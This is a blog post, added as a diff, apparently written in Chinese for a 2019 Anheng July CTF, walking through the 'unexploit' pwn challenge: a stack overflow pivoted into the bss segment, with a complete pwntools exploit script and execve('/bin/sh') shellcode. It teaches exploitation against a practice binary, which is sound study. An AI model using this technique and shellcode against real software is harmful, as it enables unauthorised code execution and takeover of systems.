@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        2019安恒7月赛部分wp - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unexploit"><span class="toc-text">unexploit</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        2019安恒7月赛部分wp
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-07-16 10:22:42</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="unexploit"><a href="#unexploit" class="headerlink" title="unexploit"></a>unexploit</h3><p>64位ELF文件，没有开启任何保护，载入IDA中查看流程</p>
+<p>程序流程很简单，main函数存在栈溢出，但是溢出的长度只有0x20，且没有可利用的plt中的函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_400626();</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>既然程序没有开启NX堆栈不可执行，那么这道题考察的知识点应该就是shellcode的使用</p>
+<p>首先我们把栈固定的地方（bss段），然后将shellcode填充到bss段，控制程序流程到shellcode，获取到shellcode</p>
+<p>具体过程：</p>
+<ul>
+<li><p>通过第一次<code>leave;ret</code>，把<code>rbp</code>移动到<code>0x601050</code>处，返回地址设置成<code>lea     rax, [rbp+buf]</code>，继续第二次读入操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_rbp =file.bss()</span><br><span class="line">addr = <span class="number">0x40068A</span></span><br><span class="line">pay_1 = <span class="string">"a"</span>*<span class="number">8</span>+p64(fake_rbp)+p64(addr)+<span class="string">"a"</span>*<span class="number">8</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过第二次<code>leave;ret</code>，把<code>rbp</code>和<code>rsp</code>的值相等，返回地址设置成<code>lea     rax, [rbp+buf]</code>，继续第三次读入操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay_2 = <span class="string">"a"</span>*<span class="number">8</span>+p64(file.bss()+<span class="number">0x10</span>)+p64(addr)+<span class="string">"a"</span>*<span class="number">8</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在第三次调用read函数的时候，首先会在栈上<code>0x601068</code>处压入下一条指令的地址，我们读入的payload刚好也是从<code>0x601068</code>读入的，那么我们payload的前八个字节就可以控制read函数的返回地址，shellcode的首地址在<code>0x601070</code>，那么我们将read的返回地址劫持到<code>0x601070</code>即可执行我们的payload</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay_3 = p64(file.bss()+<span class="number">0x10</span>)+shellcode</span><br></pre></td></tr></table></figure>
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">file=ELF(<span class="string">"./unexploit"</span>)</span><br><span class="line">r = process(<span class="string">"./unexploit"</span>)</span><br><span class="line">shellcode = <span class="string">"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"</span></span><br><span class="line">fake_rbp =file.bss()</span><br><span class="line">log.info(<span class="string">"bss:"</span>+hex(file.bss()))</span><br><span class="line">addr = <span class="number">0x40068A</span></span><br><span class="line">pay = <span class="string">"a"</span>*<span class="number">8</span>+p64(fake_rbp)+p64(addr)+<span class="string">"a"</span>*<span class="number">8</span></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.send(pay)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">pay_2 = <span class="string">"a"</span>*<span class="number">8</span>+p64(file.bss()+<span class="number">0x10</span>)+p64(addr)+<span class="string">"a"</span>*<span class="number">8</span> </span><br><span class="line">r.send(pay_2)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">pay_3 = p64(file.bss()+<span class="number">0x10</span>)+shellcode</span><br><span class="line">r.send(pay_3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
